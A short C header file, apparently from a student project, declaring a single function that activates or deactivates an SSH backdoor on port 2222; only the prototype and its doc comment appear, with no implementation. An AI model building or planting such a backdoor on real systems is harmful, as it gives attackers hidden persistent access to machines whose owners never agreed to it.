/**
 * @file backdoor.h
 *
 * @author Enzocte <enzo.cateau@etudiant.univ-lr.fr>
 * @date 2026
 */

#pragma once

#include <stdbool.h>

/**
 * @brief Activate or deactivate an SSH backdoor on port 2222
 *
 * @param stop: If true, the function will attempt to stop the backdoor if it is running. If false, it will attempt to start the backdoor.
 * @return 0 on success, 1 on failure
 */
extern int ssh_backdoor(bool stop);
